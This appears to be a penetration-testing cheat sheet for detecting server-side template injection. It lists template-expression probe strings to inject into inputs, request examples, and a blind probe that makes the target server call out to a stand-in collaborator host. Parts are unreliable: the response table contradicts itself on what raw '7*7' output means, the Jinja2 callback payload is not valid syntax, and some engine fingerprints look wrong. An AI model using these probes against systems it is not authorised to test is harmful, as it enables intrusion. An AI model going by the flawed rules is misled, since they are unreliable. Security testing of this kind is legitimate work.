# SSTI Detection — Universal Probes

## Summary
Detect SSTI by injecting probe strings and observing how they are evaluated.

## Universal Probe Set

```bash
# Test these in every user-controlled input:
# URL params, POST body, headers (User-Agent, Referer), etc.

{
  "probes": [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "{{7*'7'}}",
    "${7*'7'}",
    "{{'7'.__class__}}",
    "{{7*7}}",
    "@@7*7@@"
  ]
}
```

## Response Interpretation

| Response | Meaning |
|----------|---------|
| Output contains `49` | ✅ Math evaluated — SSTI confirmed |
| Output contains `7*7` or raw payload | ❌ Reflected verbatim — NOT SSTI |
| Output contains `7*7` or `7*'7'` | ⚠️ Partial eval — engine-specific |
| HTML error with file paths | ⚠️ Check for info disclosure |
| HTTP 500 error | ⚠️ Inconclusive — try other syntaxes |
| Empty output | ⚠️ Inconclusive — might be blind SSTI |

## Context Matters

### Reflected (output visible immediately)
```bash
# Direct reflection of input in the response
GET /hello?name={{7*7}}
→ <h1>Hello 49!</h1>   ← CONFIRMED
```

### Stored (output visible later)
```bash
# Inject in profile field, check rendered page
PATCH /profile {"name": "{{7*7}}"}
GET /profile
→ <h1>Hello 49!</h1>   ← CONFIRMED (stored SSTI)
```

### Blind / No Output
```bash
# No visible change in response
# Try OOB: collaborator callback in template
POST /feedback {"message": "{% request.get('http://COLLABORATOR/') %}"}
```

## Engine Fingerprinting

Once `{{7*7}}` = 49 is confirmed, identify the engine:

```bash
# Jinja2: {{7*'7'}} → 7777777  (string multiplication)
# Twig:   {{7*'7'}} → 49        (PHP casts string to int)
# Handlebars: {{7*'7'}} → 49    (JS coerces)
# Jinja2: {{config}} → shows Flask config object
# Twig:   {{_self}} → shows Twig environment
# Freemarker: ${7*7} → 49, <#assign x=7*7>${x} → 49
```

## False Positives

| Behavior | Likely? |
|----------|---------|
| `{{7*7}}` appears as plain text | ❌ Not SSTI |
| Angular/React `{{}}` interpolation in client-side framework | ❌ Client-side only |
| Error message shows template syntax | ⚠️ Maybe SSTI, maybe just error |
| CSS `calc(7*7)` context | ❌ CSS, not SSTI |
